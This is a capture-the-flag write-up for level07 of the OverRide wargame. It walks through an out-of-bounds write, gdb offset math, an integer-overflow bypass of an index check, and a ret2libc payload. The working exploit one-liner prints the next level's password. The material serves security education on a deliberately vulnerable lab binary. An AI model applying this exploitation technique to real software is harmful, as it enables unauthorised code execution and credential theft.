## Brief

This program prompt us with a command in order to do some operations on a buffer.
We can either `read` the buffer, `write` inside or `quit` the program.
Whenever writing or reading we are prompted with an index and a valut for the `write` function.
The thing is that there little to no protection on where we want to write or read and that's where we can exploit the binary.

## Exploit

Since we can write past the end of the buffer we can overwrite the return address of the main function and do a ret2libc attack.
To do so we first need to determine where is located the return address of the main function relatively to our buffer.

Using gdb we first see that the address of the buffer where we write into is at `0x24(%esp)`

```bash
   0x080488e3 <+448>:   lea    0x24(%esp),%eax
   0x080488e7 <+452>:   mov    %eax,(%esp)
   0x080488ea <+455>:   call   0x8048630 <store_number>
```

Which is `0xffffd554`.

```bash
(gdb) x $esp + 0x24
0xffffd554:     0x00000000
```

Now we need to find where is the return address which is at `$ebp + 0x4`.

```bash
(gdb) x $ebp + 0x4
0xffffd71c:     0xf7e45513
```

Main old `eip` is at `0xffffd71c`.

Now we can compute the index to provide to the `store` function in order to overwrite the return address.
`0xffffd71c - 0xffffd554 = 0x1c8 = 456`. So the old `eip` of main is 456 byte away from our buffer.
We still need to devide it by 4 since it's an int buffer since an int is 4 bytes wide.
So the index `114` will effectively overwrite the return address of main which is `456` bytes away.

We now face a problem because the index 114 is protected in the code, every index that are a multiple of 3 are reserved.
To bypass this protection we use the fact that the the index we provide is multiplied by 4 in order to get the correct offset in the buffer.
We want to access index 114.
`UINT_MAX = 2^32`
So `UINT_MAX / 4 + 114 = 1073741938` will overflow to `114`.
And `1073741938 % 3 = 1` which is perfect.

We just need to put:
`0xf7e6aed0 = 4159090384` at index `114` which is the address of the `system` function.
`0xf7f897ec = 4160264172` at index `116` which is the address of `/bin/bash` string inside the libc.

## Commands
 
```bash
(python -c "print('store\n' + '4159090384\n' + '1073741938\n' + 'store\n' + '4160264172\n' + '116\n' + 'quit\n')"; echo 'cat /home/users/level08/.pass')| ./level07
```

Which is the equivalent of doing:

```bash
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
